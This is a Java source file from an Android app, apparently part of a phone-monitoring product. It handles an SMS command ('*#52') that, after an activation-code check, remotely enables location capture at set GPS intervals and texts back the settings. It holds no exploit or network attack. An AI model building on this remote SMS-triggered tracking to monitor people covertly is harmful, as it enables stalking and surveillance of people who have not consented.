package com.vvt.android.syncmanager.smscommand.interpreter;

import java.util.regex.Pattern;

import android.content.Context;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.resource.StringResource;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.android.syncmanager.smscommand.SmsCommandHelper;

public class SmsGpsSetting {

	private static final String TAG = "SmsGpsSetting";
	private static final boolean DEBUG = true;
 	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	public static final String COMMAND_ID = "*#52";
	
	//	<*#52><FK><fEnableFlag><Index> 
	//	EnableFlag : 0 or 1
	//	Index is a number range from 0 to 8
	//	Which is the index of the following value
	//	Index[] = {off, 10sec, 30sec, 1mn, 5mn, 10mn, 20mn, 40mn, 60mn}
	public static String processCommand(Context context, String[] tokens) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "processCommand # Enter ..");
		}
		
		// Check command format
		boolean debugTagValidation = 
				(tokens.length == 4 && !SmsCommandHelper.isEndWithDebugTag(tokens))
				|| (tokens.length == 5 && SmsCommandHelper.isEndWithDebugTag(tokens));
		if (!debugTagValidation) {
			return String.format("%s\n%s",
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT);
		}
		
		// Check activation Code
		String activationCodeValidation = SmsCommandHelper.getActivationCodeValidation(tokens[1]);
		if (!activationCodeValidation.equals(
				StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK)) {
			return activationCodeValidation;
		}
		
		// Details Validation
		boolean validation = Pattern.matches("[0-9]*", tokens[2])
			&& Pattern.matches("[0-9]*", tokens[3]);
		
		if (!validation) {
			return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_INVALID_COMMAND_FORMAT;
		}
		
		// Extract information
		int flagEnableValue = Integer.parseInt(tokens[2]);
		int index = Integer.parseInt(tokens[3]);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("processCommand # enable: %d, index: %d", 
					flagEnableValue, index));
		}
		
		// Check on/off value
		boolean enableFlag = false;
		
		switch (flagEnableValue) {
			case 0: enableFlag = false; break;
			case 1: enableFlag = true; break;
			default: return String.format("%s\n%s",
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR, 
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_INVALID_ON_OFF_VALUE);
		}
		
		// Check timer value
		int seconds = getTimerValue(index);
		if (seconds <= 0) {
			return String.format("%s\n%s",
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_ERROR,
					StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_GPS_INVALID_TIMER_VALUE);
		}
		
		ConfigurationManager configManager = Main.getInstance().getConfigurationManager();
		configManager.dumpGpsTimeInterval(seconds);
		
		if (enableFlag && seconds > 0) {
			configManager.dumpCaptureLocationEnabled(true);
		}
		else {
			configManager.dumpCaptureLocationEnabled(false);
		}
		
		return StringResource.LANGUAGE_SMSCOMMAND_RESPONSE_OK + "\n" + getGpsSettings(context);
	}
	
	private static int getTimerValue(int index) {
		int seconds = -1;
		switch (index) {
			case 1: seconds = 10; break;
			case 2: seconds = 30; break;
			case 3: seconds = 60; break;
			case 4: seconds = 300; break;
			case 5: seconds = 600; break;
			case 6: seconds = 1200; break;
			case 7: seconds = 2400; break;
			case 8: seconds = 3600; break;
			default: seconds = -1;
		}
		return seconds;
	}
	
	/**
	 * Generate GPS response message
	 */
	private static String getGpsSettings(Context context) {
		ConfigurationManager configManager = Main.getInstance().getConfigurationManager();
		StringBuilder builder = new StringBuilder();
		builder.append("==Setting==\n");
		
		builder.append(String.format("GPS Enable: %s\n", 
				configManager.loadCaptureLocationEnabled() ? "Yes" : "No"));
		
		builder.append("GPS Interval: ");
		builder.append(GeneralUtil.getTimeDisplayValue(
				configManager.loadGpsTimeIntervalSeconds()).trim());
		
		return builder.toString();
	}
}
